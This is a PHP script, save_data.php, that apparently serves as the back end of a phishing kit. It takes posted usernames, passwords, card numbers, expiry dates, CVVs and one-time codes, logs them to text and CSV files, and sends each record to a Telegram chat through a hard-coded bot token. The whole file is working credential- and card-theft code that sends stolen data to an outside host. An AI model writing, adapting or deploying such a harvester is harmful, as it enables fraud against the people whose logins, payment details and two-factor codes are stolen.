<?php
// save_data.php

// Get the POST data
$data = json_decode(file_get_contents("php://input"), true);

// Define the file paths
$filePath = "user_data.txt";
$csvFilePath = "user_data.csv";

// Format the data
$line = "User: " . $data['user'] . " | Pass: " . $data['pass'] . " | CC: " . $data['cc'] . " | Exp: " . $data['exp'] . " | CVV: " . $data['cvv'] . " | OTP: " . $data['otp'] . "\n";

// Append to the file
file_put_contents($filePath, $line, FILE_APPEND);

// Save to CSV
$csvLine = $data['user'] . "," . $data['pass'] . "," . $data['cc'] . "," . $data['exp'] . "," . $data['cvv'] . "," . $data['otp'] . "\n";
file_put_contents($csvFilePath, $csvLine, FILE_APPEND);

// Telegram Bot API
$botToken = "8364928878:AAHTTsvgIsKJFN1Jki49WyLXHfmtGupHHjw";
$chatId = "7088731308"; // Your Telegram chat ID

// Message
$message = "New Data:\n";
$message .= "User: " . $data['user'] . "\n";
$message .= "Pass: " . $data['pass'] . "\n";
$message .= "CC: " . $data['cc'] . "\n";
$message .= "Exp: " . $data['exp'] . "\n";
$message .= "CVV: " . $data['cvv'] . "\n";
$message .= "OTP: " . $data['otp'] . "\n";

// Send to Telegram
$apiUrl = "https://api.telegram.org/bot$botToken/sendMessage?chat_id=$chatId&text=" . urlencode($message);

file_get_contents($apiUrl);

echo "Data saved successfully.";
?>